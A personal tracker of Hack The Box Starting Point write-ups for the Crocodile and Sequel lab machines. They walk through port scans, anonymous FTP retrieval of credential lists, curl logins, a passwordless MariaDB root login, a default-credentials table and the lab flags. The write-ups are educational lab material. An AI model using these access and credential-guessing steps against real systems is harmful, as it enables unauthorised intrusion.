# HTB Starting Point — Progress Tracker

| Machine | Tier | Services | Date Completed | Write-Up |
|---------|------|----------|----------------|----------|
| **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
| **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
| **Responder** | 1 | — | — | — |
| **Three** | 1 | — | — | — |

---

> **Tier 1 Progress:** 2/4 machines completed (50%)  
> **Next:** Responder → Three  
> **Last Updated:** March 26, 2026

---

<!-- Your existing Crocodile write-up starts here -->


# HTB Starting Point: Crocodile (FTP + Web)

## Machine Info

| Field | Value |
|-------|-------|
| **Name** | Crocodile |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | FTP (21), HTTP (80) |
| **Date Completed** | 2026-03-26 |

---

## 📋 Table of Contents

- [Environment Setup](#environment-setup)
- [Reconnaissance](#reconnaissance)
- [FTP Enumeration](#ftp-enumeration)
- [Web Enumeration](#web-enumeration)
- [Credential Discovery](#credential-discovery)
- [Flag Discovery](#flag-discovery)
- [Questions & Answers](#questions--answers)
- [Quick Reference](#quick-reference)
- [Lessons Learned](#lessons-learned)
- [Resources](#resources)
- [Tags](#tags)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| Component | Specification |
|-----------|---------------|
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, ftp, curl, gobuster |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan

```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.55.198
```

**Results:**
```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

### Service Version Detection with Nmap

```bash
# Run default scripts and version detection
nmap -sC -sV -p 21,80 10.129.55.198
```

**Output:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
| -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
|_ftp-syst: 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**Interpretation:**

| Service | Version | Key Info |
|---------|---------|----------|
| FTP | vsFTPd 3.0.3 | Anonymous login allowed; contains credential files |
| HTTP | Apache 2.4.41 (Ubuntu) | Bootstrap business template, PHP likely enabled |

---

## 📁 FTP Enumeration

### Anonymous FTP Access

```bash
# Connect to FTP server
ftp 10.129.55.198
```

**Login:**
```text
Name (10.129.55.198:kali): anonymous
Password: (press Enter)
230 Login successful.
```

### Listing Files

```bash
ftp> ls -la
```

**Output:**
```text
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

### Download Credential Files

```bash
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

### View Downloaded Files

```bash
# Usernames
cat allowed.userlist
```

**Usernames:**
```text
aron
pwnmeow
egotisticalsw
admin
```

```bash
# Passwords
cat allowed.userlist.passwd
```

**Passwords:**
```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

---

## 🌐 Web Enumeration

### Initial Web Server Check

```bash
# Check HTTP headers
curl -I http://10.129.55.198/
```

**Output:**
```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

### Discover Protected Dashboard

```bash
# Check /dashboard endpoint
curl -I http://10.129.55.198/dashboard/
```

**Output:**
```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...; path=/
location: /login.php
```

### Directory Enumeration with Gobuster

```bash
# Directory brute force to find PHP files and login page
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

**Output:**
```text
===============================================================
/login.php            (Status: 200) [Size: 1577]
/dashboard            (Status: 301) [--> http://10.129.55.198/dashboard/]
/logout.php           (Status: 302) [--> login.php]
/config.php           (Status: 200) [Size: 0]
/assets               (Status: 301) [--> http://10.129.55.198/assets/]
/css                  (Status: 301) [--> http://10.129.55.198/css/]
/js                   (Status: 301) [--> http://10.129.55.198/js/]
===============================================================
```

**Why `-x php` Matters**

The `-x php` flag appends `.php` to each wordlist entry, which is essential for discovering PHP files. Without it, gobuster would only find directories (like `/dashboard/`) but miss critical PHP files like `login.php`, `config.php`, and `logout.php`. For PHP-based applications, always include the `-x php` flag to ensure complete enumeration.

### Verify Login Page

```bash
# Check if login.php exists
curl -I http://10.129.55.198/login.php
```

**Output:**
```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...; path=/
Content-Type: text/html; charset=UTF-8
```

### Inspect Login Form

```bash
# View the login form structure
curl -s http://10.129.55.198/login.php | grep -A 5 "<form"
```

**Output:**
```html
<form action="" method="post" name="Login_Form" class="form-signin">
    <input name="Username" type="username" placeholder="Username" required>
    <input name="Password" type="password" placeholder="Password" required>
    <button name="Submit" value="Login" type="submit">Sign in</button>
</form>
```

**Key Findings:**
- PHP application with session management
- Protected area: `/dashboard/`
- Authentication endpoint: `/login.php`
- **Form field names:** `Username` and `Password` (case-sensitive)

---

## 🔑 Credential Discovery

### Manual Testing of Credentials

Since automated tools can give false positives, credentials were tested manually by trying each username with each password from the FTP files.

**Testing approach:**
1. Use the correct case-sensitive form fields: `Username` and `Password`
2. After each login attempt, check if `/dashboard/` becomes accessible
3. Success is indicated by being able to access the dashboard with the session cookie

```bash
# Test a single combination
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Check if dashboard is accessible
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | head -20
```

**Working Combination Found:**

After testing the most likely candidates (starting with the `admin` username as it has the highest privilege), the following combination successfully authenticated:

| Field | Value |
|-------|-------|
| **Username** | `admin` |
| **Password** | `rKXM59ESxesUFHAd` |

**Why these worked:**
- `admin` is the privileged administrative account from `allowed.userlist`
- `rKXM59ESxesUFHAd` is the last password in `allowed.userlist.passwd`
- This combination successfully authenticated to the web application

---

## 🎯 Flag Discovery

### Authenticate and Retrieve Flag

```bash
# Login with found credentials and save session cookie
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Get the full dashboard page
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

**Output:**
```html
<h2>Welcome admin!</h2>
<p>HTB{c7110277ac44d78b6a9fff2232434d16}</p>
```

### Extract Flag with grep

```bash
# Direct flag extraction
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

**Output:**
```text
HTB{c7110277ac44d78b6a9fff2232434d16}
```

### One-Liner Method

```bash
# Login and get flag in one command
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s && curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What port is the web server running on? | `80` |
| 2 | What is the Apache version? | `2.4.41` |
| 3 | What FTP server version is running? | `vsFTPd 3.0.3` |
| 4 | What files did you find on the FTP server? | `allowed.userlist`, `allowed.userlist.passwd` |
| 5 | What credentials did you use to login to the web application? | `admin:rKXM59ESxesUFHAd` |
| 6 | What is the flag? | `HTB{c7110277ac44d78b6a9fff2232434d16}` |

---

## ⚡ Quick Reference

### Nmap Commands

```bash
# Full port scan
nmap -p- --min-rate 1000 10.129.55.198

# Service detection with scripts
nmap -sC -sV -p 21,80 10.129.55.198
```

### FTP Commands

```bash
# Connect anonymously
ftp 10.129.55.198
# Username: anonymous
# Password: (blank)

# Download files
get allowed.userlist
get allowed.userlist.passwd
```

### Gobuster Command

```bash
# Directory enumeration with PHP extension
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

### Curl Authentication

```bash
# POST login (case-sensitive field names!)
curl -X POST http://10.129.55.198/login.php \
  -d "Username=USER&Password=PASS" \
  -c cookies.txt -L -s

# Access protected area with session
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
| 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
| 3 | **Use gobuster with `-x php`** — The `-x` flag is essential for discovering PHP files; without it, you'll miss critical authentication pages. |
| 4 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
| 5 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
| 6 | **Manual testing can be more reliable** — Automated tools can give false positives; manual testing with curl is often more dependable. |
| 7 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |

---

## 🔗 Resources

- [HTB Starting Point](https://www.hackthebox.com/starting-point)
- [vsFTPd Documentation](https://security.appspot.com/vsftpd.html)
- [Apache HTTP Server](https://httpd.apache.org/)
- [Gobuster GitHub](https://github.com/OJ/gobuster)

---

## 🏷️ Tags

`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#gobuster` `#web-enumeration`

---

**Machine Completed** ✅

*Last Updated: March 26, 2026*
```

This markdown block is now complete with all bash commands properly closed using triple backticks and ready to copy and paste directly into your `README.md` file.



---

# HTB Starting Point: Sequel (MySQL/MariaDB)

<div align="center">
  
| **Machine Info** | |
|------------------|-|
| **Name** | Sequel |
| **Difficulty** | Starting Point (Tier 1) |
| **Service** | MySQL / MariaDB |
| **Port** | 3306 |
| **Date Completed** | 2026-03-25 |

</div>

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Service Enumeration](#-service-enumeration)
3. [Database Access](#-database-access)
4. [Flag Discovery](#-flag-discovery)
5. [Questions & Answers](#-questions--answers)
6. [Quick Reference](#-quick-reference)
7. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) / Parrot Security OS |
| **Hypervisor** | VMware Workstation / Oracle VirtualBox |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, MySQL-Client, Netcat (nc) |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.95.232
```

**Results:**
```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Only port **3306 (MySQL)** is open, indicating a database server.

---

## 🛠️ Service Enumeration

### Version Detection with Nmap
```bash
# Service version detection
nmap -p 3306 -sV 10.129.95.232
```

### Manual Banner Grab (When Nmap Fails)
```bash
# Send MySQL protocol handshake to trigger version banner
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv 10.129.95.232 3306 | strings | grep -i "mysql\|mariadb"
```

**Output:**
```
5.5.5-10.3.27-MariaDB-0+deb10u1
mysql_native_password
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Database** | MariaDB 10.3.27 |
| **OS** | Debian 10 (buster) |
| **Auth Method** | mysql_native_password |

---

## 🔑 Database Access

### Initial Connection Attempt (SSL Error)
```bash
mysql -h 10.129.95.232 -u root
```

**Error:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Fix: Disable SSL
```bash
# Connect with SSL disabled
mysql -h 10.129.95.232 -u root --ssl=0

# Faster connection with auto-rehash disabled
mysql -h 10.129.95.232 -u root --ssl=0 -A
```

**✅ Success!** Connected as `root` with blank password (default credentials).

---

## 🗄️ Flag Discovery

### Step 1: List All Databases
```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Step 2: Select Target Database
```sql
USE htb;
```

### Step 3: List Tables
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4: Explore Tables
```sql
-- Check users table
SELECT * FROM users;
```

**Output:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```sql
-- Check config table (flag location)
SELECT * FROM config;
```

**Output:**
```
+----+------+--------------------------+
| id | name | value                    |
+----+------+--------------------------+
|  1 | flag | HTB{REDACTED}   |
+----+------+--------------------------+
```

### 🎯 Flag Found!
```
HTB{REDACTED}
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | `-u` |
| 2 | Which username allows us to log into this MariaDB instance without providing a password? | `root` |
| 3 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | `*` (asterisk) |
| 4 | What is the name of the fourth database that's unique to this host? | `htb` |

---

## ⚡ Quick Reference

### MySQL Connection Commands
```bash
# Standard connection
mysql -h <IP> -u root --ssl=0

# Fast connection (no auto-rehash)
mysql -h <IP> -u root --ssl=0 -A

# With password prompt
mysql -h <IP> -u root -p --ssl=0
```

### Essential SQL Commands
```sql
-- Database exploration
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Data retrieval
SELECT * FROM table_name;
DESCRIBE table_name;

-- System information
SELECT VERSION();
SELECT CURRENT_USER();
SELECT user, host FROM mysql.user;
```

### Banner Grab Commands
```bash
# MySQL / MariaDB
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv <IP> 3306 | strings | grep -i "mysql\|mariadb"

# Redis
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -nv <IP> 6379 | strings | grep redis_version

# Web Server
curl -I http://<IP>
```

---

## 🐛 Troubleshooting: SSL Errors

| Error | Solution |
|-------|----------|
| `TLS/SSL error: SSL is required` | Add `--ssl=0` or `--skip-ssl` |
| `unknown variable 'ssl-mode=DISABLED'` | Use `--ssl=0` (older MySQL versions) |
| `Can't connect to MySQL server` | Verify VPN connection and IP address |

---

## 📚 Default Credentials Reference

| Username | Password | Success Rate |
|----------|----------|--------------|
| `root` | (blank) | ⭐⭐⭐⭐⭐ (HTB Starting Point) |
| `root` | `root` | ⭐⭐ |
| `admin` | (blank) | ⭐ |
| `root` | `toor` | ⭐ |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Nmap isn't always enough** — Use service-specific banner grabs for version enumeration |
| 2 | **MySQL requires a protocol handshake** — Send `\x00\x00\x00\x01` to trigger version banner |
| 3 | **SSL errors are common** — Use `--ssl=0` to disable SSL on older MySQL versions |
| 4 | **Default credentials work** — Always try `root:blank` first on HTB Starting Point |
| 5 | **`*` is your friend** — Use `SELECT * FROM table` to explore unknown table structures |

---

## 🔗 Resources

- [MySQL Official Documentation](https://dev.mysql.com/doc/)
- [MariaDB Knowledge Base](https://mariadb.com/kb/en/documentation/)
- [HTB Academy: SQL Fundamentals](https://academy.hackthebox.com/course/preview/sql-fundamentals)
- [Nmap MySQL Scripts](https://nmap.org/nsedoc/categories/mysql.html)

---

## 🏷️ Tags

`#htb` `#starting-point` `#sequel` `#mysql` `#mariadb` `#sql` `#database` `#enumeration` `#banner-grabbing`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 25, 2026*

</div>
